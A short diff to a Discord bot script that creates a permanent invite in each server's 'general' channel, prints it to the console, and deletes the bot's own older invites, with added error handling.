@@ -12,16 +12,24 @@ client.on('ready', () => {
   client.guilds.forEach(async guild => {
     let channel = guild.channels.filter(channel => channel.name == 'general').first();
 
-    console.log(guild.name);
-    console.log(guild.channels.map(channel => channel.name));
-    console.log(channel.name);
-
     channel.createInvite({
       temporary: false,
       maxAge: 0,
       maxUses: 0,
       unique: true
-    }, 'because').then(invite => console.log(`${invite.url} for ${guild}`));
+    }, 'because').then(invite => {
+      console.log(`${invite.url} for ${guild}.`)
+
+      // Delete all the old invites.
+      channel.fetchInvites()
+        .then(invites => {
+          invites
+            .filter(oldInvite => oldInvite.inviter.id == client.user.id && oldInvite.url != invite.url)
+            .forEach(invite => invite.delete());
+        }).catch(() => console.log(`Could not fetch invites for ${guild}.`))
+    }).catch(() => {
+      console.log(`No invite created for ${guild}.`)
+    })
 
     let oneRolePreserved = false;
 
